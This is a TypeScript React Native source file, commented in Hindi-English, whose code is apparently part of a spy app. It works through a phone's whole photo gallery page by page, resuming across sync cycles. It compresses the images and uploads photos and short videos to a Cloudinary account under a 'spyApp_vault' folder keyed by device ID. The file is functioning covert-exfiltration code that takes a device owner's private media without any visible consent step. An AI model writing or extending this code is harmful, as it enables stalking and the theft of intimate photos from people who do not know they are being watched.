import { CameraRoll } from '@react-native-camera-roll/camera-roll';
import ImageResizer from '@bam.tech/react-native-image-resizer';
import axios from 'axios';
import AsyncStorage from '@react-native-async-storage/async-storage';

const CLOUD_NAME = 't1jlphfu';
const UPLOAD_PRESET = 'spyapp'; // ← sypapp se spyapp kiya — dashboard mein check karo exact naam
const CLOUDINARY_URL = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/upload`;

// Note: Uploaded IDs ka persistence BackgroundSyncService handle karta hai AsyncStorage se

const GALLERY_CURSOR_KEY = 'SCH_GALLERY_CURSOR';

export interface MediaItem {
  url: string;
  fileId: string;
  mediaType: string;
}

export const scanAndUploadGallery = async (
  deviceId: string,
  sessionCache?: Set<string>,
): Promise<MediaItem[]> => {

  // ── Saved cursor load karo (pehle kahan tak gaye the) ────────────────────
  let afterCursor: string | undefined = undefined;
  try {
    const saved = await AsyncStorage.getItem(GALLERY_CURSOR_KEY);
    if (saved) {
      afterCursor = saved;
      console.log(`[Gallery] Resuming from saved cursor`);
    }
  } catch (e) {}

  // ── STEP 1: CameraRoll se photos fetch karo ───────────────────────────────
  let photos: any;
  try {
    photos = await CameraRoll.getPhotos({
      first: 20,
      assetType: 'All',
      include: ['fileSize', 'filename', 'playableDuration'],
      ...(afterCursor ? { after: afterCursor } : {}),
    });
    console.log(`[Gallery] STEP1: CameraRoll returned ${photos.edges.length} items (hasNextPage:${photos.page_info?.has_next_page})`);
  } catch (err: any) {
    console.error('[Gallery] STEP1 FAILED - CameraRoll error:', err?.message || err);
    return [];
  }

  // Agar is page mein kuch nahi to cursor reset karo (sab ho gaya)
  if (photos.edges.length === 0) {
    console.log('[Gallery] All photos processed — resetting cursor for next sync cycle');
    await AsyncStorage.removeItem(GALLERY_CURSOR_KEY); // Next sync mein start se shuru
    return [];
  }

  // Cursor save karo (agle call ke liye)
  if (photos.page_info?.has_next_page && photos.page_info?.end_cursor) {
    await AsyncStorage.setItem(GALLERY_CURSOR_KEY, photos.page_info.end_cursor);
  } else {
    // Aakhri page — cursor reset karo
    await AsyncStorage.removeItem(GALLERY_CURSOR_KEY);
    console.log('[Gallery] Last page reached — cursor reset');
  }

  const uploadedItems: MediaItem[] = [];
  const targetFolder = `spyApp_vault/${deviceId}`;

  // 1. Filter out items that need processing
  const itemsToProcess: any[] = [];
  for (let idx = 0; idx < photos.edges.length; idx++) {
    const node = photos.edges[idx]?.node as any;
    if (!node || !node.image || !node.image.uri) {
      console.log(`[Gallery] Item ${idx + 1}: SKIP (invalid node or missing image/video URI)`);
      continue;
    }
    const fileUri = node.image.uri;
    const fileId = fileUri;
    const isVideo = node.type && node.type.startsWith('video');

    if (sessionCache && sessionCache.has(fileId)) {
      console.log(`[Gallery] Item ${idx + 1}: SKIP (already uploaded)`);
      continue;
    }

    if (isVideo) {
      const duration = node.playableDuration || node.duration || 0;
      if (duration > 60) {
        console.log(`[Gallery] Item ${idx + 1}: SKIP video too long (${Math.round(duration)}s)`);
        continue;
      }
      const fileSize = node.image?.fileSize || 0;
      const fileSizeMB = fileSize / (1024 * 1024);
      if (fileSize > 0 && fileSizeMB > 100) {
        console.log(`[Gallery] Item ${idx + 1}: SKIP video too large (${fileSizeMB.toFixed(2)}MB exceeds 100MB Cloudinary limit)`);
        continue;
      }
    }

    itemsToProcess.push({ node, fileUri, fileId, isVideo, idx });
  }

  // 2. Process remaining items in batches of 2 (Extra safe concurrent uploads)
  const CONCURRENCY_LIMIT = 2;
  for (let i = 0; i < itemsToProcess.length; i += CONCURRENCY_LIMIT) {
    const batch = itemsToProcess.slice(i, i + CONCURRENCY_LIMIT);
    await Promise.all(
      batch.map(async (item) => {
        const { node, fileUri, fileId, isVideo, idx } = item;

        // Image compression
        let processedUri = fileUri;
        if (!isVideo) {
          try {
            const resized = await ImageResizer.createResizedImage(
              fileUri, 1280, 1280, 'JPEG', 80, 0, undefined,
            );
            processedUri = resized.uri;
            console.log(`[Gallery] Item ${idx + 1}: Compressed OK`);
          } catch (err: any) {
            console.warn(`[Gallery] Item ${idx + 1}: Compression FAILED (using original):`, err?.message);
            processedUri = fileUri;
          }
        }

        // Cloudinary upload
        try {
          console.log(`[Gallery] Item ${idx + 1}: Uploading to Cloudinary...`);

          const formData = new FormData();
          formData.append('file', {
            uri: processedUri,
            type: isVideo ? 'video/mp4' : 'image/jpeg',
            name: `upload_${Date.now()}_${idx}.${isVideo ? 'mp4' : 'jpg'}`,
          } as any);
          formData.append('upload_preset', UPLOAD_PRESET);
          formData.append('folder', targetFolder);

          const res = await axios.post(CLOUDINARY_URL, formData, {
            headers: { 'Content-Type': 'multipart/form-data' },
            timeout: 60000,
          });

          if (res.data?.secure_url) {
            console.log(`[Gallery] Item ${idx + 1}: Upload SUCCESS -> ${res.data.secure_url.slice(-40)}`);
            uploadedItems.push({ url: res.data.secure_url, fileId, mediaType: isVideo ? 'video' : 'image' });
            if (sessionCache) sessionCache.add(fileId);
          } else {
            console.warn(`[Gallery] Item ${idx + 1}: Upload returned no URL. Response:`, JSON.stringify(res.data));
          }
        } catch (uploadErr: any) {
          const status = uploadErr?.response?.status;
          const errDetail = uploadErr?.response?.data?.error?.message || uploadErr?.message;
          console.error(`[Gallery] Item ${idx + 1}: Upload FAILED status=${status} error=${errDetail}`);

          if (status === 400 || status === 409) {
            if (sessionCache) sessionCache.add(fileId);
          }
        }
      })
    );
  }

  console.log(`[Gallery] DONE: ${uploadedItems.length}/${photos.edges.length} uploaded`);
  return uploadedItems;
};